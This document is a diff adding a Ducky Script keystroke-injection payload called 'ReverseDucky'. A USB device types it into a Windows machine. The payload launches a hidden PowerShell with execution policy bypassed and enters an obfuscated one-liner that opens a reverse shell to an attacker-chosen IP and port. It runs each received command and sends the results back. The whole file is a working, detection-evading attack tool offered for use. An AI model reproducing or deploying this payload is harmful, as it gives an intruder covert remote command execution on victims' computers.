@@ -1,0 +1,43 @@
+#      ReverseDucky
+#      Version 1.0
+#      Author: 0iphor13
+#
+#      A Reverse shell executed in the background with powershell
+#      LINE 23 - Fill the IP blocks (*FIRST BLOCK* etc) - 192 | 168 | 178 | 33
+#      LINE 25 - Change *PORT* to Port number
+#      DON'T FORGET TO START LISTENER
+
+
+DELAY 1500
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -W hidden -Exec Bypass
+DELAY 250
+ENTER
+
+DELAY 200
+STRING SeT-ITeM  VARIABLE:Q528Yl  ( [TYpE]("{3}{0}{1}{2}" -F '.','eN','cOdinG','TexT')  )  ;${clie
+DELAY 200
+STRING NT} = &("{1}{0}{2}" -f 'Objec','New-','t') ("{6}{3}{4}{0}{7}{1}{2}{5}{8}" -f'm','.S','oc
+DELAY 200
+STRING k','s','te','e','Sy','.Net','ts.TCPClient')(("{4}{1}{3}{0}{2}" -f'*3RD BLOCK*','.*2ND BLOCK*','.*4TH BLOCK*','.','*FIRST BLOCK*'),
+DELAY 200
+STRING PORT);${sTReAM} = ${cliEnt}.("{1}{2}{0}" -f'tream','G','etS').Invoke();[byte[]]${byteS} = 0..655
+DELAY 200
+STRING 35|&('%'){0};while((${I} = ${STReAM}.("{0}{1}"-f 'R','ead').Invoke(${bYtes}, 0, ${ByTES}."lENgt
+DELAY 200
+STRING h")) -ne 0){;${DATa} = (.("{3}{2}{1}{0}" -f 'ect','bj','w-O','Ne') -TypeName ("{2}{0}{3}{4}{1
+DELAY 200
+STRING }"-f 'Tex','IEncoding','System.','t','.ASCI'))."GEtStrING"(${byTes},0, ${I});${senDBaCk} = (.("{0
+DELAY 200
+STRING }{1}"-f'i','ex') ${DATa} 2>&1 | .("{0}{2}{1}"-f 'Out-Str','ng','i') );${SendBACK2} = ${sENDBAc
+DELAY 200
+STRING K} + 'PS ' + (.("{1}{0}" -f 'd','pw'))."pATH" + '> ';${sENDbyte} = ( ( GI  VaRiABLE:Q528YL )."vA
+DELAY 200
+STRING LuE"::"ASciI").("{2}{1}{0}"-f 'es','t','GetBy').Invoke(${SENdBaCK2});${STREam}.("{1}{0}"-f 't
+DELAY 200
+STRING e','Wri').Invoke(${sEnDBYTE},0,${SENdBYTE}."LengtH");${sTReAM}.("{1}{0}" -f 'lus
+DELAY 200
+STRING h','F').Invoke()};${cliENt}.("{1}{0}"-f'e','Clos').Invoke()
+DELAY 200
+ENTER
